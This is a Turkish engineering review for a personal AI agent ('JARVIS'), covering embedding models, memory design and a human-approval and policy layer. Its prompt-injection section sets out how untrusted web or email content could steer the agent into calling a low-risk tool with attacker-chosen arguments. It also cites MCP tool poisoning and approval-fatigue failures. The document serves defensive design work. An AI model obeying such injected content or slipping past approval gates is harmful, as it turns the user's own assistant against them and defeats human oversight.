Makul ama artık en iyi değil, iki somut zaafı var: **512 token bağlam sınırı** (uzun özetler/parçalar kırpılıyor) ve Türkçe'de ölçülen gerilik. **TR-TEB** (Turkish Text Embedding Benchmark, LREC 2026) sonuçlarında **BGE-M3 63,76**, **multilingual-e5-large 62,61**; e5-**base** daha da düşük. *(Bu rakamlar arama özetinden — PDF tablosu doğrudan okunmadı, orta güvenilirlik.)*

| Model | Boyut | Bağlam | Firestore uyumu (≤2048 dim) | Not |
|---|---|---|---|---|
| **BGE-M3** | 1024 dim, 568M | **8192 token** | Uygun; index yeniden kurulur | Türkçe'de e5-large'ı geçiyor, MIT. 2026'da self-host RAG'ın fiili varsayılanı |
| **gemini-embedding-001** (Vertex) | 3072 varsayılan, MRL ile **768/1536'ya kırpılabilir** | Uzun | **768'e kırparsan mevcut index'e birebir oturur** | GCP-native, Cloud Run'da model yükü yok → **soğuk başlangıç ve RAM sorunu biter**. Bedeli: token ücreti + ağ çağrısı |
| **EmbeddingGemma** | 308M, MRL 768→128 | 2K | Uygun | 500M altı MTEB lideri, cihaz-üstü. **Telefon/Wear tarafında yerel embedding için doğru cevap** |
| multilingual-e5-base (mevcut) | 768 | 512 | Mevcut index | Çalışıyor; ama ~1,1 GB her instance'da |

**Öneri:** asıl maliyet doğruluk değil, **scale-to-zero ile 1,1 GB'lık yerel model arasındaki gerilim**. İki yol:
- *Doğruluk önceliği:* e5-base → **BGE-M3** (Türkçe'de ölçülmüş kazanç, 8K bağlam; maliyeti index yeniden oluşturma 768→1024)
- *Operasyon önceliği (önerilen):* **gemini-embedding-001, `output_dimensionality=768`** — Firestore index'i hiç değişmez, kod değişikliği `E5Embedders`'ın iki metodunun içi kadar, torch bağımlılığı image'dan düşer. **Ama önce 30-50 soruluk A/B recall ölçün — Türkçe'de gemini-embedding'in e5'i geçtiğine dair bağımsız bir TR ölçümü bulunamadı.**

> ⚠️ **Prefix uyarısı:** `gemini-embedding-001`'e geçerseniz e5'in `"query: "` / `"passage: "` prefix'leri **anlamsızlaşır ve zarar verir** — Gemini bunun yerine `task_type` kullanır (`RETRIEVAL_QUERY` / `RETRIEVAL_DOCUMENT`). `E5Embedders` docstring'indeki "bir isim bir anlam" kuralı burada birebir geçerli.

### 4.8 ÇALINACAK fikirler

**M1 — Mem0'ın yazma kapısı (ADD/UPDATE/DELETE/NONE).**
→ *Yer:* `memory.py` → `remember_fact()` içine bir `_consolidate()` adımı; `facts` dokümanlarına `superseded_by`.
→ *Alternatif:* aynı işi **ADK'nın `VertexAiMemoryBankService`'i** `enable_consolidation=True` ile zaten yapıyor (`memories.generate` + **immutable memory revisions**) — önce onu değerlendirin.
→ *Efor:* 1-2 gün (kendi), yarım gün (Memory Bank + entegrasyon riski). Mem0'ın prompt'u Apache-2.0 — okuyup Türkçeleştirin, sıfırdan yazmayın.

**M2 — Bi-temporal geçersizleştirme, graf DB olmadan.**
→ *Yer:* `_attach_embedding` yanında bir `_attach_validity`; `_search_semantic_native`'deki iki `find_nearest`'a filtre.
→ *Nasıl:* Her `facts`/`profile` kaydına `valid_at`, `invalid_at`, `superseded_by`; sonuçları `invalid_at == null` ile filtrele. **Firestore `find_nearest` inequality pre-filter desteklemiyor**, o yüzden eşitlik filtresi kullanın veya post-filter yapıp `limit`'i büyütün.
→ *Efor:* 1 gün + index güncellemesi.

**M3 — ACE + ReasoningBank: ders defterini playbook'a çevir. (EN YÜKSEK GETİRİ)**
→ *Üç parça:* (a) `lessons` kayıtlarına `helpful_count` / `harmful_count` / `status(active|deprecated)`. (b) Görev başında ilgili dersleri **proaktif** olarak limitli bir "ders defteri" bloğuna enjekte et (sorgu beklemeden). (c) **Arşivci'yi "yeniden özetleyici"den Curator'e dönüştür:** bloğu baştan yazmasın, **delta** uygulasın (madde ekle / sayaç artır / deprecated işaretle) — context collapse'i mekanik olarak engeller. ReasoningBank eki: dersleri sadece başarısızlıktan değil **başarıdan da** damıt.
→ *Efor:* 2-3 gün. **"Aynı hatayı iki kez yapma" ilkesini ilk kez gerçekten uygulanabilir kılan madde bu.**

**M4 — Letta'nın limitli, ajan-editli, doluluğu görünür bloğu.**
→ *Nasıl:* `profile`'ı ajana aç ama korumalı biçimde: `{label, description, value, limit, read_only}`; context'e `chars_current/chars_limit` metadata'sıyla bas; düzenleme yalnızca `memory_replace(label, old_string, new_string)` semantiğiyle — **eski string yoksa hata dön**. Firestore transaction + `version` alanıyla optimistic concurrency; Arşivci ile ana ajan aynı anda yazarsa sessiz kayıp olmaz. **`description` alanı "ne zaman yaz" kuralını taşır — sistem promptunu şişirmez.**
→ *Efor:* 2 gün.

**M5 — Tarif katmanı: EverOS Case→Skill terfisi + Letta lazy-load.**
→ *Nasıl:* `recipes` koleksiyonunu aç. Başarılı iş akışını **hemen tarif yapma** — önce **Case** olarak kaydet (AWM kuralıyla: ham log değil, **parametreleştirilmiş adımlar**). Aynı Case deseni **N kez (öneri: 3)** başarıyla tekrarlanınca `recipe`'e terfi ettir. **Kritik: tarif gövdesi context'e her turda yüklenmez** — yalnız başlık+açıklama indekste durur, gövde ilgili olduğunda çekilir.
→ *Efor:* 2-3 gün.

**M0 — Önce bu yapılmalı:** LongMemEval'in beş kategorisinden (özellikle **knowledge update** ve **abstention**) türetilmiş **40-60 soruluk Türkçe hafıza regresyon seti**. Yukarıdaki beşinin hiçbirinin işe yarayıp yaramadığı başka türlü kanıtlanamaz — ve **Arşivci'nin bilgi yok etmesini yakalayacak tek şey bu.** Efor: 1 gün.

### 4.9 YENİDEN YAZMAYIN / YAZIN

**Yazmayın — hazırı var:**

| Yeniden yazmayın | Kullanın | Gerekçe |
|---|---|---|
| Olgu konsolidasyonu / çelişki çözme pipeline'ı | **Vertex AI Agent Engine Memory Bank** (`VertexAiMemoryBankService`, ADK'da hazır) | GCP-native, ADK entegre, `enable_consolidation`, **memory revisions ile her mutasyonun immutable sürüm geçmişi** — "Arşivci ne yaptı" sorusunun hazır cevabı |
| Konsolidasyon prompt'u (Memory Bank kullanmazsanız) | **Mem0'ın `DEFAULT_UPDATE_MEMORY_PROMPT`** (Apache-2.0) | Onbinlerce kullanımda pişmiş, dört operasyonlu, JSON şeması net |
| Embedding servisi | **Vertex `gemini-embedding-001`** veya mevcut sentence-transformers | Kendi embedding servisini ayağa kaldırmak için sebep yok |
| Hafıza benchmark'ı kurgulamak | **LongMemEval** / **LoCoMo** alt kümesini çevirin | Kategorileri hazır düşünülmüş |
| Temporal knowledge graph motoru | Gerekiyorsa Graphiti — ama **muhtemelen gerekmiyor** | Neo4j zorunluluğu scale-to-zero'yu öldürür. **Üç alanlı bi-temporal damgalama %90 faydayı %5 maliyetle verir** |

**Yazın — hazırı uymuyor:**
- **Hafıza store'unun kendisi.** İncelenen altı framework'ün **hiçbirinde Firestore adaptörü yok.** Firestore + `find_nearest` yolumuz doğru karar; bunu bir framework uğruna bırakmayın.
- **ADK'nın `FirestoreMemoryService`'ini olduğu gibi kullanmayın.** Kaynağı okundu: **keyword tabanlı** (İngilizce stop-word listesiyle), **vektör araması yok**. Türkçe için de semantik için de mevcut implementasyonumuzdan geride. ADK'nın `load_memory_tool` / `preload_memory_tool` **arayüzlerine** uyum sağlamak mantıklı, servisin kendisine değil.
- **Letta'yı kütüphane olarak almayın.** Mekanizmaları mükemmel ama 16 Mart 2026'da API'yi kırdılar. **Desenlerini kopyalayın, bağımlılığını almayın.**
- **LangMem'i bağımlılık yapmayın.** ADK tabanlı JARVIS'e ikinci bir ajan framework'ü sokmak orantısız.

---

## 5. Politika / HITL / yönetişim katmanı

### 5.1 Karşılaştırma tablosu

| Çözüm | Tip | Açık kaynak | Onay kanalları | Audit | Python/ADK uyumu | Olgunluk |
|---|---|---|---|---|---|---|
| **HumanLayer SDK** | SDK + SaaS | Apache-2.0 — **ama repo "pretty much all deprecated", SDK'lar PR #646'da silindi** | Slack, Email, SMS, WhatsApp, CLI | Backend kaydı; imzasız | Python+TS, framework-agnostik | ❌ **Terk edilmiş** → CodeLayer'a pivot |
| **Permit.io Access Request MCP** | MCP sunucusu | MIT — **repo çok küçük: 11 commit, 3 ★** | Permit Elements UI | Platform audit trail | MCP üzerinden ADK'ya takılabilir | ⚗️ Demo düzeyi |
| **Permit MCP Gateway** | Drop-in MCP proxy | Altta OPA+OPAL; ürün SaaS | Consent screen | Var (iddia) | Dil-bağımsız | ⚙️ Ticari, yeni |
| **OPA / Rego** | Politika motoru | Apache-2.0, **CNCF graduated** | Yok (karar motoru) | Decision log | REST / WASM | ✅ Olgun |
| **`@ai-sdk/policy-opa`** | Vercel AI SDK eklentisi | Açık | `requires-approval` → resume | `shadow()` ile karar logu | ❌ **TS-only** — desen olarak girer | ⚙️ Yeni, resmî Vercel dokümanı |
| **MS Agent Governance Toolkit** | 7 paketlik runtime governance | MIT | Approval + quorum (iddia) | Compliance modülü | **Python 3.10+, ADK listelenmiş** | ⚗️ Nis 2026, genç |
| **AgentLock / Open Agent Passport** | Pre-action authorization | **AGPL-3.0+** (v1.3 sonrası) | `needs_approval` bayrağı üretir | **Ed25519 imzalı, hash-zincirli receipt** | Python; AutoGen/MCP/FastAPI | ⚙️ v1.6.0, 1364 test, arXiv |
| **Google ADK tool confirmation** | Framework'ün kendi HITL'i | Apache-2.0 (adk-python v2.6.x) | `adk_request_confirmation` function-response | Yok (event stream var) | ✅ **Native** | ⚗️ `@experimental` |
| **LangGraph HITL** | interrupt/resume | MIT | Yok | Checkpointer state | Python | ✅ Olgun ama **timeout yok** |
| **OWASP AOS** | Şema/standart | Açık | — | **OCSF 6003 eşlemesi** | Dil-bağımsız | ⚗️ v1.0.0 |

### 5.2 HumanLayer — Y3'ün "rakibi" aslında terk edilmiş

**En önemli bulgu: HumanLayer artık o ürün değil.** Repo'nun kendi README'si *"the code in this repo is pretty much all deprecated"* diyor; `humanlayer.md` *"the humanlayer sdks were removed in #646"* diyor. Şirket **CodeLayer**'a pivot etti. **Yani Y3'ün birebir rakibi bakımsız bir arşiv.**

Mekanizmayı kıyaslanabilir kılmak için son gerçek SDK sürümünün (`v0.7.5`) kaynağı doğrudan okundu:

```python
@hl.require_approval()                 # tool'un KENDİSİNİ sarar
def send_email(to: str, subject: str, body: str): ...
contact_a_human = hl.human_as_tool()   # insanı bir tool olarak modele verir
```

Felsefe **İlke 6 ile aynı**: *"HumanLayer is baked into the tool/function itself, guaranteeing a human in the loop"* — model insafına bırakılmıyor.

**Alınacak tasarım detayları:**
- `SlackContactChannel.allowed_responder_ids` — **kimin cevap verebileceğini kısıtlıyor**, diğer mesajlar yok sayılıyor. Tek kullanıcılı bizde bile "onayı kim verdi" alanının kanıtlanabilirliği demek.
- **Karar modeli ikili değil, seçenekli:**
  ```python
  class ResponseOption(BaseModel):
      name: str; title: str | None; description: str | None
      prompt_fill: str | None; interactive: bool = False
  ```
  `require_approval(reject_options=[...])` ile **hazır ret gerekçeleri**; `prompt_fill` seçilen gerekçenin **modele geri gidecek metnini önceden dolduruyor**. Bu, "reddet" düğmesini kör bir duvar olmaktan çıkarıp modele yön veren bir sinyale çeviriyor.
- **Ret zorunlu olarak gerekçeli:** tip sisteminde `FunctionCallStatus.Rejected` yorumsuz kurulamıyor (`ValueError("FunctionCallStatus.Rejected with no comment")`). Sonuç modele tool çıktısı olarak dönüyor: `"User in {context} denied {fn} with message: {comment}"` — **eylem çalışmıyor ama ajan ölmüyor.**

**Zaman aşımı — en keskin fark. HumanLayer'da YOK:**
```python
def fetch_approval(self, spec) -> FunctionCall.Completed:
    call = self.create_function_call(spec)
    while True:
        self.sleep(3)
        ...
```
3 saniyede bir poll eden **sonsuz blokaj**. Kodda `# todo lets do a more async-y websocket soon` yorumu duruyor. Eskalasyon da **elle tetikleniyor**.

**Y3 ile mekanik karşılaştırma:**

| Eksen | HumanLayer | JARVIS Y3 |
|---|---|---|
| Kapının yeri | Tool'u saran decorator | Ayrı policy katmanı, tüm ajanlar + dış AI'lar |
| Karar kaynağı | Kodda | Kodda renk bölgeleri — **aynı felsefe** |
| Kanal | Slack/Email/SMS/WhatsApp/CLI | **FCM push + Android etkileşimli kart** |
| **Zaman aşımı** | ❌ Yok (sonsuz poll) | ✅ **Var, varsayılan = reddet** |
| Ret gerekçesi | ✅ Zorunlu, modele geri besleniyor | ⚠️ Kontrol edilmeli |
| Ret seçenekleri | ✅ `ResponseOption` + `prompt_fill` | ⚠️ Kontrol edilmeli |
| Barındırma | ❌ Bulut (varsayılan) | ✅ Kendi Cloud Run + Firestore |
| Bakım | ❌ **Terk edilmiş** | ✅ Aktif |

### 5.3 Permit.io ve OPA

**Permit Access Request MCP'nin deseni değerli:** onay, ajanın kodundaki bir `if` dalı değil, **politika modelindeki bir kaynak**. MCP sunucusu access request / operation approval tool'ları açıyor ama **hiçbiri eylemi yürütmüyor** — yalnızca onay nesnesi yaratıyor; asıl eylem `permit.check()` geçtiğinde çalışıyor ve o check ancak insan onayladıktan sonra `true` dönüyor.
> **Yetki ayrımı ilan edilerek değil, TOOL YÜZEYİNİN ŞEKLİYLE sağlanıyor: ajanın elinde "yürüt" tool'u zaten yok.**

**OPA — 2026'da ajan eylem yetkilendirmesi için gerçekten kullanılıyor.** En öğretici parça **`@ai-sdk/policy-opa`** (Vercel'in *resmî* dokümanında), çünkü karar modeli **bizim renk bölgelerimizle birebir örtüşüyor**:

| Karar | Davranış | Bizdeki karşılığı |
|---|---|---|
| `allow` | Tool hemen çalışır | 🟢 YEŞİL |
| `deny` | Reddedildi sonucu döner, model üzerine akıl yürütür | 🔴 KIRMIZI-sert |
| `requires-approval` | **Run durur, onay yanıtı beklenir** | 🔴/🟡 |
| `not-applicable` | Düşer, allow sayılır | — |

> **`requires-approval`'ın MOTORUN BİRİNCİ SINIF ÇIKTISI olması kritik: onay, uygulama kodunda dallanma değil, POLİTİKANIN SÖYLEDİĞİ bir şey.**

Politikaya giden input: `{ tool: {name}, args, messages, runtimeContext }`. Ek özellikler: **WASM ile in-process** değerlendirme (ağ turu yok — cold start için önemli), backend hatasında **fail-closed**, **`shadow()` ile enforce etmeden karar loglama**, `opaCapabilityMiddleware` ile **modelin tool listesini görmeden önce filtreleme**, MCP'de keşfedilen tool'lara varsayılan karar atama, ve dispatcher tool'ları (bash, http) için **transitive enforcement**. `opa test` ile politika birim testi.

### 5.4 Prompt injection'a mimari savunma — 2026 durumu

Alan "modele daha iyi söyle" fikrini bıraktı; **mimari kısıtlamaya** geçti.

**Design Patterns (arXiv 2506.08837 — IBM, Invariant Labs, ETH Zürih, Google, Microsoft).** Ortak ilke tek cümlede:
> *Bir LLM ajanı untrusted girdiyi bir kez yuttuktan sonra, o girdinin herhangi bir sonuçlu eylemi tetiklemesi imkânsız hale getirilmelidir.*

Altı desen: **Action-Selector** (en güvenli, en esneksiz), **Plan-Then-Execute** (plan kullanıcı promptundan üretilir ve **değiştirilemez**), LLM Map-Reduce, Dual LLM, Code-Then-Execute, Context-Minimization. Desen seçmek açıkça bir **fayda/güvenlik takası** olarak sunuluyor.

**CaMeL (arXiv 2503.18813).** *Privileged LLM* güvenilir kullanıcı sorgusundan planı üretir; *Quarantined LLM* untrusted veriyi **tool erişimi olmadan** işler. Aradaki yorumlayıcı her değere **capability** metadata'sı iliştirip veri kökenini izler ve **her tool çağrısından önce** politikayı uygular. Kontrol akışı yalnız güvenilir sorgudan çıktığı için untrusted veri programın akışını **hiçbir zaman** etkileyemiyor. Ölçüm: AgentDojo'da görevlerin **%77'si kanıtlanabilir güvenlikle** çözülüyor (savunmasız sistem %84) — **~%8 fayda kaybıyla sınıf düzeyinde garanti.**

Devamı: *CaMeLs Can Use Computers Too* (arXiv 2601.09923), *Type-Directed Privilege Separation* (arXiv 2509.25926), ve **The Attack and Defense Landscape of Agentic AI** (arXiv 2603.11088, **USENIX Security 2026**) — 128 makaleden **51 saldırı ve 60 savunma** kataloğu; tehdit modeli kurmak için bugünkü en iyi tek kaynak.

**JARVIS bu manzarada nerede — dürüst cevap:**

İlkemiz **ikinci yarıyı** uyguluyor: "sonuçlu eylem" kapısı var, kodda yazılı, modelin insafına bırakılmamış. **Doğru ve literatürün onayladığı taraf.**

> ⚠️ **Ama ilk yarısı eksik: veri kökeni takibimiz yok.** Renk bölgeleri *tool'a* bakıyor, *argümanın nereden geldiğine* bakmıyor. **Somut kaçak:** bir web sayfası ya da e-posta içeriği bağlama girer, modeli YEŞİL bölgedeki bir tool'u **saldırganın seçtiği argümanlarla** çağırmaya ikna eder — politika katmanı bunu **sorunsuz geçirir**, çünkü tool yeşil. Aynı şey misafir kapısından gelen dış AI mesajı için de geçerli. İncelenen çözümlerin **hiçbiri** bu boşluğu kapatmıyor; kapatan tek yaklaşım **CaMeL ailesi ve AgentLock'un lineage'ı**.

İkinci gözlem: **Action-Selector / Plan-Then-Execute ayrımı yapmıyoruz.** Fabrikadan çıkan ajanın planı çalışırken yuttuğu veriyle değişebiliyorsa, TTL ve bütçe tavanı **ekonomik** kısıt sağlıyor ama **akış bütünlüğü** sağlamıyor.

### 5.5 Audit log şema standartları

**Tek hâkim standart yok.** Üç aday:

1. **OpenTelemetry GenAI semantic conventions** — `gen_ai.*` öznitelikleri; her tool çağrısı ve retrieval adımı child span. **Durum:** May 2026 itibarıyla hâlâ "Development"; **12 Haz 2026'daki v1.42.0'da tüm `gen_ai.*` öznitelikleri ayrı bir GenAI reposuna taşındı.** Bu bir **gözlemlenebilirlik** şeması — güvenlik audit şeması değil.
2. **OWASP AOS (Agent Observability Standard) — Security Layer v1.0.0.** **OCSF'i genişletiyor:** ajan olaylarını **API Activity sınıfı 6003**'e eşliyor. Actor `type_id 99` = AI ajanı; `api.operation` = `"tools/call"`; ajana özgü her şey `unmapped.aos` bölümünde. Correlation UID ile çok-ajanlı akış ilişkilendirmesi.
3. **OCSF** — SIEM tarafının ortak dili.

**Eğilim (standart değil, yakınsıyor): kriptografik makbuz.** AgentLock/OAP Ed25519 imzalı ve hash-zincirli kayıt üretiyor; Nobulex, CausalLayer, Proofpane, KYDE, HELM aynı fikri farklı isimlerle. Ortak sav: **audit log'un tamper-evident olması, sadece var olması yetmiyor.**

> **Pratik sonuç:** Firestore sistem-of-record kalsın; ama audit dokümanının **alan adları** OCSF 6003 + AOS'a göre isimlendirilsin ve aynı karar bir OTel span'i olarak da yayılsın. **Yeniden yazma değil, isimlendirme disiplini.**

### 5.6 Onay UX desenleri

**Üç mimari desen:** senkron kapı (maksimum kontrol/gecikme — geri alınamaz eylemler için) · asenkron eskalasyon (ajan devam eder; **reddi geriye işleyebilmek gerekir**) · paralel geri bildirim (en düşük gecikme; **rollback yeteneği şart**).

> ⚠️ **Onay yorgunluğu bir GÜVENLİK AÇIĞIDIR, UX konforu değil.** Belgelenmiş vaka: risk skoru eşiğini aşan her eyleme kapı koyan bir ekip ikinci ayda **günde 200+ inceleme**ye ulaştı; incelemeciler toplu onaylamaya başladı; altı ay sonra onay oranı **neredeyse %100**'dü ve **gerçek denetim sıfırdı**. **Bir koşu 40 onay istiyorsa ürün zaten başarısız.**

**Zaman aşımı — iki okul:**
- *Bloke et, süre koyma:* HumanLayer, LangGraph. LangGraph dokümantasyonu açıkça kabul ediyor: "30 dakikada kimse yanıtlamazsa eskale et" demenin **yerleşik mekanizması yok**.
- *Süre koy + varsayılan uygula:* Prefactor ve **JARVIS Y3**. Geri alınamaz eylem için **`timeout = reddet`** (fail-closed) doğru varsayılan. **Ama geri alınabilir eylem için "reddet" bilgi kaybettirir; oradaki daha iyi varsayılan `timeout = süresi doldu + bildir`** — ajan kararsızlığı öğrenip alternatif deneyebilsin.

**İkili olmayan onay.** ADK'nın `ToolConfirmation.payload`'ı "onayla ama değiştirerek" örüntüsünü mümkün kılıyor: kullanıcı `{"approved_days": 5}` döner, tool `min(approved_days, days)` uygular. LangGraph aynı üçlüyü adlandırıyor: **approve-as-is / reject-and-alt-route / edit-the-proposed-action**.

**Kartın içinde ne olmalı:** tam eylem, değişecek durum, ajanın hangi yetkiyle istediği, **kanıt/tetikleyici**, belirsizlik, alternatifler ve **geri alınabilirlik**. *"Ajan X, Y eylemini yapmak istiyor: onayla/reddet"* gösteren bir kart **bilgili karar üretmez**.

**Kademeli izin merdiveni** ("bir kez / bu oturum / her zaman"): tek kullanıcılı sistemde yorgunluğa karşı en ucuz araç — ve "her zaman izin ver" seçimi bizde bir tool'u SARI'dan YEŞİL'e taşıyan **denetlenebilir bir politika değişikliği** olarak kaydedilebilir.

### 5.7 EU AI Act — bugün bizi bağlamıyor

Madde 2(10) "deployer" tanımından **tamamen kişisel, mesleki olmayan faaliyetleri** çıkarıyor. JARVIS Kadir'in kişisel kullanımındaysa **AI Act yükümlülüğü doğmuyor.** Üç sınır: (1) çıktı kamuya yayılırsa (özellikle deepfake) Madde 50 şeffaflık yükümlülükleri devreye girebilir; (2) içerikten düzenli gelir elde edilirse veya ticari faaliyet kapsamına girerse muafiyet düşer; (3) kullanılan temel modellerin sağlayıcıları kendi yükümlülüklerini taşır — bu bize geçmez.

> **Pratik sonuç: bugün için regülasyon politika katmanımızın gerekçesi DEĞİL. Gerekçe mühendislik güvenliği. Uyum tiyatrosu yapmaya gerek yok.**

**MCP güvenliği:** Yetkilendirme spec'i OAuth 2.1 + PKCE; Haz 2025 revizyonu **RFC 8707 Resource Indicators**'ı zorunlu kıldı (token passthrough saldırılarına yanıt). Ama spec **tool poisoning, rug pull ve cross-server tool shadowing'e karşı yerleşik savunma içermiyor.** Tem 2025 taramasında en az **1.862 açık MCP örneği** kimlik doğrulamasız yanıt veriyordu; tool poisoning **%72.8'e kadar başarılı**, ajanlar **%3'ün altında** reddediyor. CSA önerileri misafir kapımıza doğrudan uygulanabilir: **tool açıklamalarını ilk görüşte pinle ve her yeniden bağlanışta diff'le**, `tools/list` yanıtını *untrusted input* say, egress'i default-deny allowlist'le, credential'ları sunucu başına ayır.

**Agent identity — standartlaşma kaynıyor, konsensüs yok.** IETF'te 2026 Q1'de üç taslak: `draft-oauth-ai-agents-on-behalf-of-user` (`requested_actor` parametresi), `draft-klrc-aiagent-auth` (WIMSE), `draft-mishra-oauth-agent-grants` (**DAAP** — DID tabanlı kriptografik ajan kimliği + **cascade revocation**).
> **Çözülmeye çalışılan asıl problem multi-hop delegasyon: bir ajan başka bir ajanı doğurup o da üçüncüsünü çağırdığında yetkinin nasıl DARALARAK taşınacağı. Bu tam olarak bizim ajan fabrikası problemimiz.** Hiçbiri henüz RFC değil — bugün birini seçmek erken, ama **fabrikanın ürettiği ajana verilen yetkinin türetilmiş ve daraltılmış olduğunu modelleyen** bir iç temsil, yarın DAAP/OBO'ya eşlenebilir.

### 5.8 JARVIS'in politika katmanı bu manzarada nerede duruyor

**İlke 6 egzotik değil — 2026'nın yakınsadığı doğru cevap.** OAP makalesinin adversaryal ölçümü bedeli de gösteriyor: izin verici politikada **%74.6 sosyal mühendislik başarısı**, deterministik kısıtlayıcı politikada **879 denemede %0**. **Doğru savaşı seçmişiz.**

**ÖNDE olduğumuz yerler:**
- ✅ **Zaman aşımı = reddet.** HumanLayer'da yok, LangGraph'ta yok, kendi dokümantasyonlarında eksiklik olarak kabul ediliyor
- ✅ **Push-native mobil onay kartı.** İncelenen hiçbir çözümde yok — hepsi Slack/e-posta/web dashboard
- ✅ **Politika RED kararının onay kartına bağlanması** — çoğu çözümde `deny` ile `needs approval` ayrı dünyalar
- ✅ **Misafir kapısı.** Dış AI'ları kendi PDP'mizin birinci sınıf öznesi yapmak, Permit MCP Gateway'in proxy yaklaşımından **kavramsal olarak daha derin**
- ✅ **Fabrika kısıtları** (TTL + bütçe + kayıt defterinden seçim + ajan üretememe) — `opaCapabilityMiddleware`'in capability scoping'i ile aynı fikir ve DAAP'nin çözmeye çalıştığı multi-hop probleminin pratik cevabı
- ✅ **Tek kullanıcı kapsamı** onay yorgunluğu tuzağını yapısal olarak küçültüyor

**GERİDE olduğumuz yerler:**
- ❌ **Politika incelenebilir bir artefakt değil.** Python kodunda olması İlke 6'yı sağlıyor ama `opa test`'in, shadow mode'un, "politikayı kod incelemesinden ayrı gözden geçirme"nin karşılığı yok. **Bir kural değişikliğinin ne kırdığını ancak çalıştırarak öğreniyorsun.**
- ❌ **Veri kökeni / taint takibi yok.** **En büyük gerçek boşluk** (§5.4'teki YEŞİL-tool-kötü-argüman kaçağı).
- ❌ **Audit log imzasız ve zincirsiz.** "Kendi asistanının kendi logunu düzeltmediğini" kanıtlayan hiçbir şey yok.
- ❌ **Standart şema yok** — ileride herhangi bir araca bağlamak elle eşleme demek.
- ⚠️ **ADK'nın kendi HITL'i kullanılmıyor** (veya kullanıldığı doğrulanmadı) — el yazısı pause/resume framework'ün mekanizmasıyla çakışıyor olabilir.
- ⚠️ **Renk bölgeleri özgün değil.** YEŞİL/SARI/KIRMIZI = herkesin low/medium/high'ı. Kusur değil — **yakınsak tasarım** — ama "özgün" hanesine yazılmamalı.

> **Özet: kavramsal olarak sektörle aynı hizada, mekanik olarak bazı yerlerde önde (timeout, push kanalı, misafir kapısı), mühendislik hijyeni olarak geride (test edilebilir politika artefaktı, provenance, imzalı log). Yeniden yazılması gereken bir şey yok; eklenmesi gereken üç şey var.**

### 5.9 ÇALINACAK fikirler

**P1 — Politikanın çıktısını 4 değerli yap + `shadow` modu.**
`allow / deny / requires-approval / not-applicable`. `requires-approval`'ı **politikanın kararı** yap (uygulamanın dallanması değil) — SARI/KIRMIZI ayrımı tek yerde tanımlanır. Yanına **`shadow` bayrağı**: yeni bir kural önce enforce etmeden sadece "ne olurdu" diye loglasın. **Tek kullanıcılı bir sistemde politika değiştirmenin en korkulu tarafı kendini kilitlemek; shadow mode bunu bedava çözer.** Motor hatasında **fail-closed** davranışını açıkça test et.

**P2 — Tipli ret + hazır ret gerekçeleri.**
(a) Ret gerekçesiz kurulamasın — **tip düzeyinde zorla**. (b) Gerekçe modele tool çıktısı olarak dönsün (`"Kullanıcı {fn} çağrısını reddetti: {comment}"`) — ajan uyarlansın, ölmesin. (c) Android kartına politikadan gelen **hazır ret düğmeleri** (`name/title/description/prompt_fill`) — tek elle, bir dokunuşla, modelin bir sonraki adımını yönlendiren ret.

**P3 — İkili olmayan onay: yapılandırılmış karşı-teklif.**
"Onayla / Reddet" yerine **"Onayla ama şu parametreyle"**: kart eylemin kritik argümanını düzenlenebilir gösterir, kullanıcı `{"limit": 5}` döner, tool bunu kendi tarafında kısıtlar. En çok bütçe/tutar/kapsam içeren eylemlerde işe yarar.

**P4 — Oturum düzeyinde taint bayrağı. (EN YÜKSEK GÜVENLİK GETİRİSİ)**
Bağlama untrusted içerik girdiği anda (web sayfası, e-posta gövdesi, dosya içeriği, **misafir kapısından gelen dış AI mesajı**) oturuma `tainted=true` işareti koy. Politika bu bayrağı okusun: **taint varken yazma/gönderme sınıfı YEŞİL tool'lar otomatik SARI'ya terfi etsin.**
> **Tek boolean, payload okumadan, sınıf düzeyinde prompt injection kapsaması.** Bir sonraki adım parametre bazlı lineage — ama önce bu.

**P5 — Tamper-evident audit + standart alan adları.**
Her policy kararına: **önceki kaydın hash'ini içeren bir zincir alanı**, ve alan adlarını OCSF `api.operation` / actor `type_id 99` / `unmapped.aos` yapısına yakın isimlendirme. Aynı kararı OTel `gen_ai.*` span'i olarak da yay. İmzalama tek kullanıcıda opsiyonel; **hash zinciri neredeyse bedava ve logu geriye dönük düzeltilemez kılıyor.**

**P6 (gerekirse) — Dispatcher tool'lar için transitive enforcement.** İleride shell/HTTP gibi genel bir tool açarsak, komutu politikaya vermeden önce mantıksal (eylem, hedef) çiftine ayrıştır ve aynı kurallardan geçir. **Aksi halde "bash" tek bir renk kutusunda tüm bölgeleri delen bir arka kapı olur.**

### 5.10 YENİDEN YAZMAYIN

**A) Politika motorunu elle büyütmeye devam etme — ama tam OPA'ya da atlama.**
*Öneri:* kuralları Python kodundan çıkarıp **deklaratif bir tabloya** (YAML/JSON) taşı ve o tabloya **bir test paketi** yaz. Enforcement kodu Python'da kalsın.
*Neden tam OPA değil:* Rego, tek kullanıcılık bir sisteme ikinci bir dil, ikinci bir zihinsel model ve Cloud Run'da ya WASM derleme adımı ya sidecar getiriyor. **Kural sayısı ~30'un altındaysa bu bedel karşılığını vermez.**
*Neden yine de deklaratif:* Vercel/OPA'nın asıl kazancı Rego değil, **politikanın kodun dışında, tek başına test edilebilir ve gözden geçirilebilir bir artefakt olması**. YAML + test ile bunun %80'i alınır. **Kural sayısı 50'yi geçerse** veya misafir kapısına çok kiracılı bir şey bağlanırsa, geçiş tabloyu derleyerek yapılır.

**B) HumanLayer'ı benimseme. Kesinlikle hayır.** Terk edilmiş, bulut varsayılanı, mobil push yok, **timeout hiç yok**. Kopyalanacak şey **kodu değil tip tasarımı**: zorunlu gerekçeli ret, `ResponseOption`, ve kapının tool'un kendisine gömülü olması ilkesi.

**C) Onay taşıma katmanını (kuyruk + FCM + Android kartı) yeniden yazma — zaten doğru ve rakiplerde yok.**
⚠️ **Ama bir şeyi doğrula:** ADK'nın native `require_confirmation` / `ToolContext.request_confirmation()` mekanizması el yazısı pause/resume'umuzun **yerini alabilir mi?** Avantajı: durdurma/devam etme ADK akışının içinde olur; `require_confirmation` bir **callable** de alabildiği için eşik mantığı (`amount > 1000`) doğrudan oraya yazılabilir.
**Gerçek bloke ediciler olabilir:** özellik **`@experimental(FeatureName.TOOL_CONFIRMATION)`** ile işaretli (adk-python v2.6.x, Ağu 2026'da hâlâ öyle), ve dokümante edilmiş kısıtı: **`DatabaseSessionService` ve `VertexAiSessionService` desteklenmiyor.** JARVIS'in session service'i bunlardan biriyse özellik bugün kullanılamaz. **Karar vermeden önce bunu ölç.**

**D) Audit şeması icat etme.** OCSF 6003 + OWASP AOS alan adlarını ödünç al.

